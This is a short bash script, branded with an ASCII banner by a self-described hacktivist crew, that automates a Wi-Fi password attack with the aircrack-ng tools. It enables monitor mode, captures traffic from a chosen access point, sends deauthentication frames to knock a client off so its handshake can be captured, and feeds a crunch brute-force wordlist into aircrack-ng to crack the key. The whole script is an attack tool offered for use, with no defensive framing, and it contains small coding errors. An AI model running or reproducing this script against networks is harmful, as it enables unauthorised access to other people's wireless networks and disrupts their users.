
echo "__      _(_)/ _(_)___| | _(_|_)"
echo "\ \ /\ / / | |_| / __| |/ / | |"
echo " \ V  V /| |  _| \__ \   <| | |"
echo "  \_/\_/ |_|_| |_|___/_|\_\_|_|"
echo "this program coded by sm1l3 and w3s7"
echo "we hacker crew is ptestation"
echo "we are haktvist"
echo "this module is master of wifi hacking tool"
echo "instagram adress ptestation"

airmon-ng
airmon-ng start wlan0
airodump-ng mon0
echo "input bssid"
read $bssid
airodump-ng -c 11 --bssid $bssid -w log mon0
echo "input station"
read $sta
aireplay-ng -0 1 -a $bssid -c $sta mon0
crunch 4 8 1234567890qwertyuiopasdfghjklzxcvbnm | aircrack-ng --bssid $bssid -w- log-02.cap
 
